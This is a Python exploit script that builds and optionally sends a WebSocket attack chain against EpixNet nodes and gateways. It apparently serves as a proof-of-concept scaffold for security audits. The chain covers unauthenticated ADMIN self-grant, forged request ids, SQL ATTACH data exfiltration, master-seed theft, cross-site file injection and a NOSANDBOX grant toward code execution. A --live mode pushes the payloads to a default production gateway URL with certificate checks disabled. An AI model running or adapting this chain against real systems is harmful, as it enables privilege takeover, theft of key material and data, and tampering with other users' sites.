#!/usr/bin/env python3
"""
EpixNet WS payload builder — reusable PoC scaffold for CDC CHAINER passes.

Use as the starting point for a new Chainer pass against an EpixNet target.
The script encodes the exact wire format of every stage of the full chain
(see rust-p2p-edge-case-audit/references/epixnet-full-chain-2026-08-17.md for
the matrix). Two run modes:

  --mode=gateway  restricted-gateway chain (Branch A): pre-auth connect →
                  permissionAdd ADMIN → dbQuery ATTACH chart.db → SELECT
                  sample → dormant-plant dump.
  --mode=node     non-restricted Rust v0.4.x chain (Branch B): forged-id
                  admin → userShowMasterSeed → `as <victim> fileWrite`.
                  Requires `--features multiuser` on the node binary.

DRY-RUN by default (serialises each payload + prints its single code anchor).
Add `--live` to push the payloads over a real WS. Use only against targets you
are authorised to test.

Re-using for a non-EpixNet target with a similar WS command API
- Replace the `ANCHORS` dict entries with your target's file:line anchors.
  Keep one anchor per stage so the script remains a self-contained audit
  artefact (the anchor printout IS the audit trail).
- Replace the `*_*` payload builders below (`payload_permission_add`,
  `payload_admin_command`, `payload_as_file_write`, `payload_db_query_attach`,
  `payload_db_query_select`) with the equivalent wire shapes for your target's
  command API. The shape `{cmd, id, params}` is EpixNet-specific — your target
  may use JSON-RPC or another framing. Keep a 1:1 mapping function-per-stage so
  the matrix steps stay literal.
- Leave the `chain_gateway` / `chain_nonrestricted_node` skeletons in place —
  the gateway vs node branching (restricted → dormant plant; non-restricted →
  active takeover) is the most reusable piece for "Chainer consolidator" passes.

Dependencies:
  - `websockets` Python library for `--live` (pip install websockets)
  - Python 3.9+ (standard library only for dry-run).

Example (dry-run the gateway branch):
  python3 epixnet-chain-builder.py --mode=gateway

Example (live run against a node):
  python3 epixnet-chain-builder.py --mode=node --live
"""

import argparse
import asyncio
import base64
import json
import ssl
import sys
from typing import Any, Optional


# ---------------------------------------------------------------------------
# Code anchors — one file:line per chain stage. Edit when porting to a new
# target so the dry-run output is itself an evidence table.
# ---------------------------------------------------------------------------

ANCHORS = {
    "WRAPPER_ID_BASE":              "command.rs:16      WRAPPER_ID_BASE = 1_000_000",
    "handle_text_id_unverified":    "lib.rs:3170        id = req.get('id').and_then(|v| v.as_i64()).unwrap_or(0)  (NO HMAC)",
    "is_ws_origin_allowed":         "state.rs:14293     empty Origin or loopback host → true",
    "ws_upgrade_untrusted":         "lib.rs:3010        WsSession::new(state, Some(addr)) — trusted=false",
    "wrapper_key_is_public":        "lib.rs:1235        wrapper_key == bech32 address (no secret)",
    "admin_commands_omits_permAdd": "command.rs:46-49   permissionAdd intentionally NOT admin-gated",
    "dispatcher_admin_gate":        "command.rs:340-360 restrict branch + elevated/has_admin branch",
    "elevated_req_id":              "command.rs:351     elevated = session.trusted || req_id >= WRAPPER_ID_BASE",
    "xite_has_admin":               "state.rs:7540-7547 xite_has_admin(addr) checks settings.permissions for 'ADMIN'",
    "ui_restrict_default_false":    "state.rs:1811-1816 ui_restrict defaults FALSE",
    "gateway_read_cmds":            "command.rs:118-132 GATEWAY_READ_COMMANDS allow-list (chartDbQuery present)",
    "write_cmds_gate2":             "command.rs:365     Gate 2 only fires when restrict=true",
    "permissionAdd_handler":        "command.rs:3115-3137 handler → add_permission(addr, permission)",
    "add_permission_no_validate":   "state.rs:7484-7506 NO denylist, NO confirm-token → permissions.push",
    "save_grants_persist":          "state.rs:7506,7550-7556 save_grants() → permissions.json",
    "dbQuery_handler":              "command.rs:1474-1497 -> db_query(addr, query, params)",
    "db_query_lazy_build_exec":     "state.rs:5986-6025 lazy build + db.query_value(query, params)",
    "query_value_no_filter":        "epix-db/src/lib.rs:145-148 passes SQL straight to rusqlite prepare (NO SELECT filter)",
    "chart_query_select_only":      "chart.rs:143-148   *does* filter SELECT — chartDbQuery only, NOT dbQuery",
    "as_metacommand":              "command.rs:418-448 rebinding + inherits elevated id",
    "as_caller_elevated":          "command.rs:436-441 caller_elevated = trusted || req_id >= WRAPPER_ID_BASE || xite_has_admin",
    "as_inner_id_propagates":       "command.rs:447     inner_id = if caller_elevated { req_id.max(WRAPPER_ID_BASE) } else { req_id }",
    "fileWrite_handler":           "command.rs:1758-1791 inner_path + content_base64 → write_file",
    "userShowMasterSeed_cfg":      "command.rs:3318-3329 #[cfg(feature=\"multiuser\")] returns master_seed",
    "multiuser_current_seed":      "state.rs:14353-14356 self.user.read().await.master_seed.clone()",
    "multiuser_feature_crate":     "crates/epix-ui/Cargo.toml:68 multiuser = []",
    "user_from_seed_deterministic":"state.rs:14362      User::from_seed(seed) → derives master_address and per-xite keys",
    "permissionDetails_NOSANDBOX":  "command.rs:3170-3174 NOSANDBOX = 'Allow this xite to run any code on your machine'",
}

def anchor(key: str) -> str:
    return ANCHORS.get(key, "")


# ---------------------------------------------------------------------------
# WS payload builders — one per chain stage. Edit when porting; keep the
# stage names (permission_add / admin_command / db_query_attach / etc.) so
# the matrix references map 1:1.
# ---------------------------------------------------------------------------

def payload_permission_add(req_id: int, perm: str = "ADMIN") -> str:
    return json.dumps({"cmd": "permissionAdd", "id": req_id, "params": perm})


def payload_admin_command(cmd: str, req_id: int, params: Any = None) -> str:
    if params is None:
        params = {}
    return json.dumps({"cmd": cmd, "id": req_id, "params": params})


def payload_db_query_attach(req_id: int, db_file: str, alias: str) -> str:
    return json.dumps({"cmd": "dbQuery", "id": req_id,
                       "params": [f"ATTACH DATABASE '{db_file}' AS {alias}", {}]})


def payload_db_query_select(req_id: int, sql: str, params: Any = None) -> str:
    return json.dumps({"cmd": "dbQuery", "id": req_id,
                       "params": [sql, params if params is not None else {}]})


def payload_chart_db_query(req_id: int, sql: str, params: Any = None) -> str:
    if params is None:
        params = {}
    return json.dumps({"cmd": "chartDbQuery", "id": req_id, "params": [sql, params]})


def payload_as_file_write(req_id: int, target_xite: str, inner_path: str,
                          content_bytes: bytes) -> str:
    b64 = base64.b64encode(content_bytes).decode("ascii")
    return json.dumps({"cmd": "as", "id": req_id,
                       "params": [target_xite, "fileWrite", [inner_path, b64]]})


# ---------------------------------------------------------------------------
# Chain branch A — restricted gateway: dormant plant + data exfil.
# Edit stages here to match a new target's restricted-mode primitives.
# ---------------------------------------------------------------------------

async def chain_gateway(target_uri: str, xite_address: str, *, live: bool = False):
    print("=" * 78)
    print(f"CHAIN MODE: GATEWAY (ui_restrict=true)   target={target_uri}")
    print(f"  xite address:  {xite_address}  ← {anchor('wrapper_key_is_public')}")
    print("=" * 78)

    print("\n[STEP 1] Pre-auth WS connect")
    print(f"  {anchor('is_ws_origin_allowed')}")
    print(f"  {anchor('ws_upgrade_untrusted')}")
    print(f"  {anchor('wrapper_key_is_public')}")

    print("\n[STEP 2] permissionAdd ADMIN — privilege self-grant (no admin gate)")
    print(f"  payload: {payload_permission_add(1)}")
    print(f"  {anchor('admin_commands_omits_permAdd')}")
    print(f"  {anchor('permissionAdd_handler')}")
    print(f"  {anchor('add_permission_no_validate')}")
    print(f"  {anchor('save_grants_persist')}")

    print("\n[STEP 3] Restrict branch refuses non-read admin cmds")
    print(f"  {anchor('dispatcher_admin_gate')}")
    print(f"  {anchor('gateway_read_cmds')}")
    print(f"  BUT permissionAdd is NOT gated → grant already executed.")

    print("\n[STEP 4] dbQuery ATTACH chart.db — data exfil (not gated, pre-auth)")
    print(f"  payload 1: {payload_db_query_attach(2, 'data/chart.db', 'c')}")
    print(f"  payload 2: {payload_db_query_select(3, 'SELECT type_id, name FROM c.type')}")
    print(f"  payload 3: {payload_db_query_select(4, 'SELECT address FROM c.site')}  ← xite enum")
    print(f"  payload 4: {payload_db_query_select(5, 'SELECT * FROM c.data LIMIT 100')}  ← telemetry/identity")
    print(f"  {anchor('dbQuery_handler')}")
    print(f"  {anchor('db_query_lazy_build_exec')}")
    print(f"  {anchor('query_value_no_filter')}    ← ATTACH works on dbQuery (no SELECT filter)")
    print(f"  contrast: {anchor('chart_query_select_only')}")

    print("\n[STEP 5] Persistent privilege plant (dormant)")
    print(f"  state: permissions.json now contains {{'{xite_address}': ['ADMIN']}}")
    print(f"  {anchor('save_grants_persist')}")

    print("\n[STEP 6] Latent escalate — armed, fires on re-config")
    print(f"  trigger: operator flips ui_restrict=false OR moves data dir to non-restricted peer")
    print(f"           (ui_restrict defaults FALSE — {anchor('ui_restrict_default_false')})")
    print(f"  activation: {anchor('dispatcher_admin_gate')}")
    print(f"              + {anchor('xite_has_admin')}")

    payloads = [
        payload_permission_add(1),
        payload_db_query_attach(2, "data/chart.db", "c"),
        payload_db_query_select(3, "SELECT type_id, name FROM c.type"),
        payload_db_query_select(4, "SELECT address FROM c.site"),
        payload_db_query_select(5, "SELECT * FROM c.data LIMIT 100"),
    ]
    if live:
        await _send_live(target_uri, payloads)


# ---------------------------------------------------------------------------
# Chain branch B — non-restricted Rust v0.4.x (multiuser) node.
# ---------------------------------------------------------------------------

async def chain_nonrestricted_node(target_uri: str, xite_address: str, *,
                                   assume_multiuser: bool = True,
                                   victim_xite: Optional[str] = None,
                                   payload_path: Optional[str] = None,
                                   payload_bytes: Optional[bytes] = None,
                                   live: bool = False):
    print("=" * 78)
    print(f"CHAIN MODE: NON-RESTRICTED RUST NODE   target={target_uri}")
    print(f"  xite address:  {xite_address}")
    print(f"  multiuser:     {assume_multiuser}   ({anchor('multiuser_feature_crate')})")
    print("=" * 78)

    print("\n[STEP 1] Pre-auth WS connect  (same anchors as gateway branch)")
    print(f"  {anchor('is_ws_origin_allowed')}")
    print(f"  {anchor('wrapper_key_is_public')}")

    print("\n[STEP 2] permissionAdd ADMIN (persists even when not strictly needed here)")
    print(f"  payload: {payload_permission_add(1)}")
    print(f"  {anchor('admin_commands_omits_permAdd')}")

    print("\n[STEP 3] Admin branch active via forged req_id (id ≥ 1_000_000) or xite_has_admin grant")
    print(f"  OR via the step-2 grant")
    print(f"  {anchor('elevated_req_id')}")
    print(f"  id is client-controlled with no HMAC: {anchor('handle_text_id_unverified')}")

    print("\n[STEP 4] dbQuery ATTACH chart.db — data exfil (same as gateway branch)")
    print(f"  {anchor('db_query_lazy_build_exec')}")
    print(f"  {anchor('query_value_no_filter')}")

    print("\n[STEP 6] Persistent plant — already durable")
    print(f"  {anchor('save_grants_persist')}")

    if assume_multiuser:
        print("\n[STEP 8n] userShowMasterSeed — master seed theft")
        print(f"  payload: {payload_admin_command('userShowMasterSeed', 1000002)}")
        print(f"  {anchor('userShowMasterSeed_cfg')}")
        print(f"  {anchor('multiuser_current_seed')}")
        print(f"  → returns cleartext BIP39/BIP32 master seed → offline derives every per-xite key")
        print("\n[STEP 9n] Offline: User::from_seed(seed) reproduces every key")
        print(f"  {anchor('user_from_seed_deterministic')}")

    if victim_xite and payload_path and payload_bytes is not None:
        print(f"\n[STEP 10n] `as <victim> fileWrite <path> <b64>`")
        print(f"  target xite: {victim_xite}")
        print(f"  inner_path:  {payload_path}")
        print(f"  payload:     {payload_as_file_write(1000003, victim_xite, payload_path, payload_bytes)}")
        print(f"  {anchor('as_metacommand')}")
        print(f"  {anchor('as_caller_elevated')}")
        print(f"  {anchor('as_inner_id_propagates')}")
        print(f"  {anchor('fileWrite_handler')}")
        print(f"  Gate 2 (xite_owned) skipped because restrict=false: {anchor('write_cmds_gate2')}")

        print("\n[STEP 11n] Content injection → potential RCE via NOSANDBOX")
        print(f"  (NOSANDBOX grantable via the same permissionAdd path: {anchor('permissionDetails_NOSANDBOX')})")
        print(f"  payload: {payload_permission_add(1000004, 'NOSANDBOX')}")

    payloads = [
        payload_permission_add(1),
        payload_admin_command("siteList", 1000001),
        payload_db_query_attach(2, "data/chart.db", "c"),
        payload_db_query_select(3, "SELECT * FROM c.site"),
    ]
    if assume_multiuser:
        payloads.append(payload_admin_command("userShowMasterSeed", 1000002))
    if live:
        await _send_live(target_uri, payloads)


# ---------------------------------------------------------------------------
# Live WS push — only when --live is explicitly passed AND target is one you
# are authorised to test.
# ---------------------------------------------------------------------------

async def _send_live(target_uri: str, payloads: list[str]) -> None:
    try:
        import websockets
    except ImportError:
        print("\n[!] websockets module not installed; cannot send live. Run: pip install websockets")
        return
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    print(f"\n[live] connecting to {target_uri}")
    async with websockets.connect(target_uri, ssl=ssl_ctx, open_timeout=10) as ws:
        for idx, p in enumerate(payloads, 1):
            print(f"[live][{idx}/{len(payloads)}] send → {p[:120]}{'…' if len(p) > 120 else ''}")
            await ws.send(p)
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"        ← {str(resp)[:300]}{'…' if len(str(resp)) > 300 else ''}")
            except asyncio.TimeoutError:
                print("        ← (no response in 5s)")


# ---------------------------------------------------------------------------
# CLI — keep these defaults; the running examples are written to align with
# the existing EpixNet known addresses.
# ---------------------------------------------------------------------------

GATEWAY_URI = ("wss://gateway.epixnet.io/EpixNet-Internal/Websocket"
               "?wrapper_key=epix1dashanwfts3qcflekhmkvcz66ss4kxz2tr2k6g")
DASHBOARD_ADDR = "epix1dashanwfts3qcflekhmkvcz66ss4kxz2tr2k6g"
# Use 127.0.0.1 placeholders for the node example to avoid hard-coding another
# party's IP. The actual run target URI should be passed by the operator.
NODE_URI = ("ws://127.0.0.1:42222/EpixNet-Internal/Websocket"
            f"?wrapper_key={DASHBOARD_ADDR}")


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--mode", choices=("gateway", "node"), default="gateway")
    parser.add_argument("--target", help="Override target WS URI (default: gateway or node demo)")
    parser.add_argument("--xite", help="Override bound xite address")
    parser.add_argument("--live", action="store_true",
                        help="Send the payloads over a real WS connection (target must be authorised)")
    parser.add_argument("--assume-no-multiuser", action="store_true",
                        help="Treat the node as not built with --features multiuser")
    parser.add_argument("--demo-victim", action="store_true",
                        help="Include the as-fileWrite demo (Branch B step 10n)")
    args = parser.parse_args(argv)

    if args.mode == "gateway":
        target = args.target or GATEWAY_URI
        xite = args.xite or DASHBOARD_ADDR
        asyncio.run(chain_gateway(target, xite, live=args.live))
    else:
        target = args.target or NODE_URI
        xite = args.xite or DASHBOARD_ADDR
        asyncio.run(chain_nonrestricted_node(
            target, xite,
            assume_multiuser=not args.assume_no_multiuser,
            victim_xite="epix1REPLACE_ME_victim" if args.demo_victim else None,
            payload_path="/index.html" if args.demo_victim else None,
            payload_bytes=b"<!-- injected -->" if args.demo_victim else None,
            live=args.live,
        ))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
